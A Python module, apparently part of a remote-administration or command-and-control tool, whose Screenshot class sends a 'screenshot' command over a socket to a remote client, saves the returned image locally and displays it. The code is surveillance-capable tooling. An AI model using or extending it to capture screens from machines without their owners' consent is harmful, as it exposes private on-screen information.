from Server import Server
from PIL import Image

class Screenshot:
    """
    Represents a Submodule that extends the Module class.
    This class handles the modular functionality of downloading a screenshot taken by the client.
    """

    def __init__(self, connection, local_path):
        """
        Initializes the Submodule with a name and description.
        """

        self.name = "Screenshot"
        self.description = "This module handles the process of downloading a screenshot taken by the client."

        self._connection = connection
        self._local_path = local_path

    def askForScreenshot(self):
        """
        Ask the client to take the screenshot
        """
        self._connection.send(b'screenshot')

    def saveScreenshot(self, path):
        """
        Receives the file contents from the socket and writes it into the local file
        """

        file = open(path, 'wb')
        chunk = self._connection.recv(1024)
        while chunk:
            try:
                file.write(chunk)
                chunk = self._connection.recv(1024)
            except:
                file.close()
                return True

    def execute(self):
        """
        Executes the Submodule.
        """

        print(f"Executing Submodule {self.name} - {self.description}")

        # Ask the client to deliver the specified file
        self.askForScreenshot()

        # Gets the file contents and saves it in the local path
        self.saveScreenshot(self._local_path)

        # Open the image for UX
        Image.open(self._local_path).show()

        return f"Done! Screenshot taken and saved to {self._local_path}"

